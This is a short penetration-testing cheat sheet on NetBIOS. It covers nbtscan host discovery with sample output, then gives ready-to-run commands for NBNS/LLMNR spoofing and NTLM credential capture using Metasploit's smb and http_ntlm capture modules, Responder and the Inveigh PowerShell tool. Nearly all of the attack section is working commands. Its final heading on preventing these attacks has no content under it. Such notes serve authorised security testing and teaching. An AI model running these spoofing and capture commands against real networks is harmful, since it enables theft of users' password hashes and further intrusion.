# Netbios

### Broadcast discovery

```
nbtscan 172.18.2.0/24
	
172.18.2.9:GCDTA0000:00U
172.18.2.9:WORKGROUP:00G
172.18.2.9:GCDTA0000:20U
172.18.2.9:MAC:00-23-7d-aa-72-c2
```

### Netbios Spoofing

#### Metasploit

```
use auxiliary/server/capture/smb
set CAINPWFILE /netbios/cain.
set JOHNPWFILE /netbios/john. 

set LOGFILE /netbios/SMB_LOG.txt
set SRVHOST 10.222.101.213
run
	
use auxiliary/server/capture/http_ntlm
set CAINPWFILE /netbios/cain-http
set JOHNPWFILE /netbios/john-http
set SRVHOST 10.222.101.213
set SRVPORT 80
set URIPATH /
run
	
use auxiliary/spoof/nbns/nbns_response
set INTERFACE eth0
set SPOOFIP 10.222.101.213
run
```

#### Responder

```
responder -I eth0 -w -f -v
```

#### Inveigh - (Powershell Responder)

requires privileged user.

https://n0where.net/windows-powershell-llmnrnbns-spoofer-inveigh\
https://github.com/Kevin-Robertson/Inveigh

```
cd C:\Users\Leon\powermenu\Inveigh\Inveigh-master
Import-Module .\Inveigh.psm1
```

To execute with default settings

```
Invoke-Inveigh
```

To execute with features enabled/disabled

```
Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP Y -HTTPS Y -SMB Y -ConsoleOutput Y -IP <yourIP>
```

You must Stop Inveigh manually

```
Stop-Inveigh
```

### Preventing Netbios attacks
